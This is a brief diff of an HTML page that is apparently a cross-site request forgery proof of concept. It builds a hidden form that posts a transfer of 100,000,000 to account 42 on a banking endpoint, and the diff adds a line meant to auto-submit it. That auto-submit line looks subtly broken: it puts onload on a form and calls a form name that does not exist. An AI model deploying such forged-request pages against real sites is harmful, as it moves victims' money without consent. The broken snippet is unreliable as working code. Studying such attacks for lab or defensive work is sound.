@@ -5,7 +5,7 @@
 </head>
 <body>
 	<h1>Send a POST request</h1>
-	<form method="post" action="http://svb:5003/transfer/1">
+	<form method="post" action="http://svb:5003/transfer/1" onload="document.form1.submit()">
 		<input type="hidden" name="account" value="42">
 		<input type="hidden" name="amount" value="100000000">
 		<input type="submit" value="Submit">
